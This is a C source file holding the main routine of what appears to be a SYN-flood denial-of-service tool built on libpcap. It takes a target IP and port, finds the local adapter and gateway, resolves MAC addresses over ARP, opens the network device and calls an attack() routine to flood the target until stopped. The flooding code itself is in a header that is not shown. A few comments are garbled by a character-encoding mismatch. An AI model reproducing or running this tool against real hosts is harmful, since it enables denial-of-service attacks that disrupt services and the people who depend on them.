/*
	Author:				Ex
	Create time:		2018-05-19
	last modification:	2018-05-28
*/
#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<pcap.h>
#include"ex_net.h"
#include"ex_func.h"

#ifdef WIN32
#pragma comment(lib,"wpcap.lib")
#endif // WIN32

int main(int argc,char **argv)
{
	puts("The program is running.");
	puts("Welcome to use this program, if you have any problem or suggestion");
	puts("you can open the website www.eonew.cn to connect author, have a nice day");
#if 1
	if (argc != 3)
	{
		fprintf(stderr, "\nParameter Error:\tThe parameter you entered is wrong\nplease enter like \"syn  192.168.1.1  80\"");
		exit(1);
	}

	unsigned short port = atoi(argv[2]);
	unsigned char d_attack_ip[4];
	*(int *)d_attack_ip = str_to_ip(argv[1]);
#else
	unsigned short port = 80;
	unsigned char d_attack_ip[4] = { 192,168,3,10 };
#endif
	

	my_single_adapter *adapter = NULL;
	my_single_addr *address = NULL;
	char errbuf[PCAP_ERRBUF_SIZE] = { 0 };
	
	puts("Getting the address information");
	if (get_my_addr(&address,errbuf, d_attack_ip) == -1)
	{
		fprintf(stderr, "\n%s\nError information:\t%s\n%s\n", "Error:\tFailed to get the address information", errbuf, "please open the website www.eonew.cn to connect author");
		exit(1);
	}
	else
	{
		puts("Obtained the address information successfully");
	}

	
	

	puts("Getting the adapter information");
	int key = is_same_network(d_attack_ip, address->ip, address->mask);
	if (key == 0)
	{
		puts("\nWarining:\tYour target is on the same LAN as you are!");
		if (get_my_adapter(&adapter, d_attack_ip) == -1)
		{
			fprintf(stderr, "\nError:\tFailed to get the adapter information\nplease open the website www.eonew.cn to connect author\n");
			exit(1);
		}
	}
	else
	{
		if (get_my_adapter(&adapter, address->ip) == -1)
		{
			fprintf(stderr, "\nError:\tFailed to get the adapter information\nplease open the website www.eonew.cn to connect author\n");
			exit(1);
		}
	}
	puts("Obtained the adapter information successfully");

	int i;
	if (*(int *)adapter->gateway == NULL)
	{
		puts("Warning:\tFailed to get the gateway ip address!");
	}

	printf("Open the device(%s)\n",adapter->description);
	pcap_t *opened_dev = pcap_open_live(address->name, 65535, 1, 0, errbuf);
	if (opened_dev == NULL)
	{
		fprintf(stderr, "\nError:\tOpen the device failed\n");
		exit(1);
	}
	else
	{
		puts("Opened the device successfully");
	}
	// ����pcap_loop, pcap_next_ex�Ȳ�����Ϊ������ģʽ, Ĭ��Ϊ 0 ����ģʽ
	// FreeBsd ��������ø�ѡ���ץ������������ʱ
	pcap_setnonblock(opened_dev, 1, errbuf);


	unsigned char destination_mac[6] = { 0 };
	if (key==0)
	{
		printf("Getting the the MAC address of ");
		print_net_normal(d_attack_ip, 4);
		if (use_ip_get_mac(opened_dev, adapter->ip, adapter->ip_mac, d_attack_ip, destination_mac) == -1)
		{
			fprintf(stderr, "\nError:\tplease open the website www.eonew.cn to connect author\n");
			exit(1);
		}
	}
	else
	{
		printf("Getting the the MAC address of gateway:");
		print_net_normal(adapter->gateway, 4);
		//Get the gatewat to connect the internet
		if (use_ip_get_mac(opened_dev, adapter->ip, adapter->ip_mac, adapter->gateway, adapter->gateway_mac) == -1)
		{
			fprintf(stderr, "\nError:\tplease open the website www.eonew.cn to connect author\n");
			exit(1);
		}
		for (i = 0;i < 6;i++)
		{
			destination_mac[i] = adapter->gateway_mac[i];
		}
	}

	if (*(int *)destination_mac == NULL)
	{
		fprintf(stderr, "\nFailed to obtained the MAC, please open the website www.eonew.cn to connect author");
		exit(1);
	}
	else
	{
		puts("Obtained the MAC successfully");
	}

	puts("Start attacking, press Ctrl + C to stop attacking");
	attack(opened_dev,address->ip, d_attack_ip, destination_mac, port);
	
	pcap_close(opened_dev);
	puts("The program is over");
}
